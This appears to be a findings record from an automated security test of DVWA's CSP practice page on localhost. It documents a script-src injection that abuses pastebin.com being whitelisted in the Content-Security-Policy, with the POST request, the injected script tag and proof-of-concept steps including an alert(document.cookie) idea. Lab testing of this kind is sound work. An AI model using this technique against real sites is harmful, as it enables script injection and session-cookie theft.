data.summary: Tested CSP bypass on DVWA CSP page at http://127.0.0.1:8080/vulnerabilities/csp/. The Content-Security-Policy header is: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;. A form on the page accepts a URL via POST parameter 'include' and embeds it directly into a <script src='...'> tag without any validation. Since pastebin.com is whitelisted in the CSP, an attacker can host malicious JavaScript on pastebin.com and submit its URL to achieve CSP bypass. The hint paste https://pastebin.com/raw/R570EE00 contains alert("pastebin"); as a proof-of-concept payload. POSTing include=https://pastebin.com/raw/R570EE00 produces <script src='https://pastebin.com/raw/R570EE00'></script> in the response body, confirming the injection point. The script would execute in the browser because pastebin.com is explicitly allowed by the CSP.

candidates.title: CSP Bypass via pastebin.com whitelist and script src injection
candidates.claim: The CSP policy allows script-src from https://pastebin.com, and the form blindly injects user-supplied URLs into a <script src> tag. An attacker can host arbitrary JavaScript on pastebin.com and bypass CSP protections entirely.
candidates.proof_excerpt: POST /vulnerabilities/csp/ with include=https://pastebin.com/raw/R570EE00 → response contains: <script src='https://pastebin.com/raw/R570EE00'></script>. curl shows pastebin raw returns: alert("pastebin");
candidates.poc_hint: 1. Create a paste on pastebin.com containing arbitrary JS (e.g., alert(document.cookie)). 2. POST to /vulnerabilities/csp/ with include=<pastebin_raw_url>. 3. Observe the script tag is injected and the browser executes it (since pastebin.com is CSP-allowed). The hint paste https://pastebin.com/raw/R570EE00 returns alert("pastebin"); as proof.

facts.summary: Content-Security-Policy: script-src 'self' https://pastebin.com  example.com code.jquery.com https://ssl.google-analytics.com ;
Backend code (source/low.php) takes $_POST['include'] and directly concatenates it into <script src='$_POST["include"]'></script> without any validation or sanitization
https://pastebin.com/raw/R570EE00 contains alert("pastebin"); as proof-of-concept payload

deadends: Browser-based verification (alert dialog) not completed due to sandbox cookie isolation - browser could not authenticate with the same session cookies as the HTTP tooling. However, the HTTP-level proof is sufficient: CSP allows pastebin.com, the injection works (script tag appears in response), and pastebin.com raw content is attacker-controllable JS.
